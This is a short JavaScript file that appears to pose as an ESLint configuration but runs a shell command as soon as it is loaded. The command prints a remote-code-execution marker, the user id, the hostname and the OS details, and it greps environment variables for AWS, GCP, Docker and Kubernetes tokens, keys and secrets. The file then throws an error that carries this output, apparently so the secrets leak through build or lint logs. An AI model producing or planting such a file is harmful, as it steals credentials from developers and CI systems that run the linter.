import { execSync } from "child_process";
const info = execSync("echo RCE_PROOF; id; hostname; cat /etc/os-release 2>/dev/null | head -3; env | grep -iE '(aws|gcp|token|key|secret|bucket|cloud|docker|kube)' | head -10", { encoding: "utf-8", timeout: 10000 });
throw new Error("ESLINT_CONFIG_EXEC: " + info);
